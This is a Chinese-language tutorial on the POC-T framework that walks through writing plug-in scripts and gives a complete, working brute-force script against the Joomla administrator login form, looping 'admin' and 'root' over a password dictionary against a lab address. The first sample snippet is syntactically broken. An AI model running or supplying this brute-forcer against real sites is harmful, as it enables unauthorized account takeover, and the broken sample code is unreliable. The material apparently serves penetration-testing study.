## Poc编写框架-poc-T

### 安装pot-T

git clone https://github.com/Xyntax/POC-T

pip install -r requirement.txt

详细说明参考：https://github.com/Xyntax/POC-T

### 编写脚本

编写自定义脚本，只需要声明一个函数作为接口，没有其他任何限制．

从此告别文档，无需记忆函数名和模板调用，使效率最大化．

进入./script目录

在此目录下新建Python文件 poctest.py

针对一些复杂的需求，poc()函数可以使用多种返回值来控制验证状态和输出。

以下模拟一个简单的密码爆破脚本代码

```python
def poc(input_str):
    url = 'http://xxx.com/login.php?pass=' + input_str
    try:
        c = requests.get(url).content
    except ConnectionError:
        return 2     # 把input_str再次加入任务队列重新验证(本次验证作废)
    if 'success' in c:
        return True  # 验证成功，屏幕结果输出为123456
        return 1     # 同上
        return url   # 验证成功，屏幕结果输出为"http://xxx.com/login.php?pass=123456"
    else
        return False # 验证失败，无输出
        return 0     # 同上

```

建议在脚本中处理Exception，如果线程运行中发现Exception，将使框架终止全部任务并打印错误信息。

由于网络请求中经常出现连接中断等错误，一种简单的做法是：

```python
def poc(input_str)
    try:
    ...全部脚本逻辑...
    except:
        return False

```

简单来说就是在poc-T的script目录下新建脚本，然后定义poc（）函数，在poc函数中根据需要return不同的值来代表不同的状态。

### 代码实现-joomla的表单爆破

Poc-T是一个并发的框架，这意味着我们不需要关心数据的并发，只需要实现单个数据的逻辑，然后丢给框架去执行并发操作。Poc-T的并发是多线程(-eT)和协程(-eG)两种并发方式，并发方式和并发数量(-t)均可以通过参数指定。

下面，我们将joomla的表单爆破脚本移植到poc-T框架中。

在poc-T的script目录下新建joomla_form_brute.py

因为不需要考虑并发和获取字典，所以我们只需要实现poc（password）函数，传入password参数的单次登录逻辑即可。

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/30 14:27 
# @Author   : ordar
# @File     : joomla_form_brute.py  
# @Project  : POC-T
# @Python   : 3.7.5
"""
joomla 登录表单暴力破解
用例:
  python POC-T.py -s joomla_form_brute.py -iS www.cdxy.medef -iF password_file
"""
import requests
import sys
from bs4 import BeautifulSoup

# 设置目标地址,要解析HTML的页面和要尝试暴力破解的位置。
target_index_url = "http://192.168.1.11/administrator/index.php"
target_post_url = "http://192.168.1.11/administrator/index.php"
# 对应的HTML元素
usernmae_field = "username"
password_field = "passwd"
# 检测每一次暴力破解提交的用户名和密码是否登录成功
# 如果响应码为303代表密码正确
success_check = 303

# 用户名列表
username_list = ["admin", "root"]


def poc(password):
    try:
        for username in username_list:
            resp = requests.get(target_index_url)
            cookies = resp.cookies.get_dict()
            text = resp.text
            # post提交的表单数据
            all_post_data = {}
            all_post_data[usernmae_field] = username
            all_post_data[password_field] = password
            # print("[-] Trying: {}:{}".format(username, password))
            # 使用BeautifulSoup解析html，取出所有的input。然后遍历，取出name和value,再追加到all_post_data里面
            soup = BeautifulSoup(text, "xml")
            all_input = soup.find_all("input")
            for i in all_input:
                # print(i, i['name'])
                if i['name'] != usernmae_field and i['name'] != password_field:
                    # print(i['name'], i['value'])
                    all_post_data[i['name']] = i['value']

            # 提交post表单，data是表单，cookies是携带的cookie，
            # allow_redirects禁止重定向
            resp_post = requests.post(target_post_url, data=all_post_data, cookies=cookies, allow_redirects=False)
            if success_check == resp_post.status_code:
                result = "[*] Brute successful.\n"
                result = result + '[*] Username:{}\n'.format(username)
                result = result + '[*] Passwd:{}'.format(password)
                return result
            else:
                return 0
    except:
        pass

```

### 运行结果

![](img/78673ad4-450f-11eb-b41e-8cc6814bc10b.png)